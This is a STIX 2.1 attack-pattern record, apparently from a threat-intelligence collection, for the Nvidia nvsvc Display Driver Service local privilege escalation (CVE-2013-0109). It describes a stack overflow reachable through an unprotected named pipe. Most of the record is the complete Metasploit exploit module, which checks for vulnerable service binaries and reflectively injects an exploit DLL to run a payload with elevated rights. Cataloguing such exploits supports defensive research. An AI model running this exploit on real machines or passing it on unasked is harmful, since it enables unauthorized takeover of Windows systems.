{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b89963e2-34ce-431c-aa6c-941f6ab37df1",
    "created": "2024-08-14T16:49:18.526326Z",
    "modified": "2024-08-14T16:49:18.526329Z",
    "name": "Nvidia (nvsvc) Display Driver Service Local Privilege Escalation",
    "description": " The named pipe, \\pipe\\nsvr, has a NULL DACL allowing any authenticated user to interact with the service. It contains a stacked based buffer overflow as a result of a memmove operation. Note the slight spelling differences: the executable is 'nvvsvc.exe' the service name is 'nvsvc', and the named pipe is 'nsvr'.  This exploit automatically targets nvvsvc.exe versions dated Nov 3 2011, Aug 30 2012, and Dec 1 2012. It has been tested on Windows 7 64-bit against nvvsvc.exe dated Dec 1 2012.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/nvidia_nvsvc.rb",
            "external_id": "nvidia_nvsvc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0109"
        },
        {
            "source_name": "reference",
            "url": "http://nvidia.custhelp.com/app/answers/detail/a_id/3288"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Post::Windows::Services\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Nvidia (nvsvc) Display Driver Service Local Privilege Escalation',\n          'Description' => %q{\n            The named pipe, \\pipe\\nsvr, has a NULL DACL allowing any authenticated user to\n            interact with the service. It contains a stacked based buffer overflow as a result\n            of a memmove operation. Note the slight spelling differences: the executable is 'nvvsvc.exe',\n            the service name is 'nvsvc', and the named pipe is 'nsvr'.\n\n            This exploit automatically targets nvvsvc.exe versions dated Nov 3 2011, Aug 30 2012, and Dec 1 2012.\n            It has been tested on Windows 7 64-bit against nvvsvc.exe dated Dec 1 2012.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Peter Wintersmith', # Original exploit\n            'Ben Campbell', # Metasploit integration\n          ],\n          'Arch' => ARCH_X64,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows x64', {} ]\n          ],\n          'Payload' => {\n            'Space' => 2048,\n            'DisableNops' => true,\n            'BadChars' => \"\\x00\"\n          },\n          'References' => [\n            [ 'CVE', '2013-0109' ],\n            [ 'OSVDB', '88745' ],\n            [ 'URL', 'http://nvidia.custhelp.com/app/answers/detail/a_id/3288' ],\n          ],\n          'DisclosureDate' => '2012-12-25',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_fs_md5\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    vuln_hashes = [\n      '43f91595049de14c4b61d1e76436164f',\n      '3947ad5d03e6abcce037801162fdb90d',\n      '3341d2c91989bc87c3c0baa97c27253b'\n    ]\n\n    if session.platform == 'windows'\n      svc = service_info 'nvsvc'\n      if svc && svc[:display] =~ (/NVIDIA/i)\n        vprint_good(\"Found service '#{svc[:display]}'\")\n\n        begin\n          if is_running?\n            vprint_good('Service is running')\n          else\n            vprint_error('Service is not running!')\n          end\n        rescue RuntimeError\n          vprint_error('Unable to retrieve service status')\n          return Exploit::CheckCode::Unknown\n        end\n\n        path = svc[:path].gsub('\"', '').strip\n        if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n          path.gsub!('system32', 'sysnative')\n        end\n\n        begin\n          hash = client.fs.file.md5(path).unpack('H*').first\n        rescue Rex::Post::Meterpreter::RequestError => e\n          print_error(\"Error checking file hash: #{e}\")\n          return Exploit::CheckCode::Detected\n        end\n\n        if vuln_hashes.include?(hash)\n          vprint_good(\"Hash '#{hash}' is listed as vulnerable\")\n          return Exploit::CheckCode::Vulnerable\n        else\n          vprint_status(\"Hash '#{hash}' is not recorded as vulnerable\")\n          return Exploit::CheckCode::Detected\n        end\n      else\n        return Exploit::CheckCode::Safe\n      end\n    end\n  end\n\n  def is_running?\n    status = service_status('nvsvc')\n    return (status and status[:state] == 4)\n  rescue RuntimeError\n    print_error('Unable to retrieve service status')\n    return false\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    print_status('Launching a process to host the exploit and reflectively injecting and executing the exploit DLL...')\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    library_path = ::File.join(Msf::Config.data_directory,\n                               'exploits',\n                               'CVE-2013-0109',\n                               'nvidia_nvsvc.x86.dll')\n    encoded_payload = payload.encoded\n    # Forceably run the a 32-bit process because our payload is 32-bit even though\n    # we're running on x64.\n    execute_dll(library_path, encoded_payload)\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-25",
    "x_mitre_platforms": [
        "win'"
    ]
}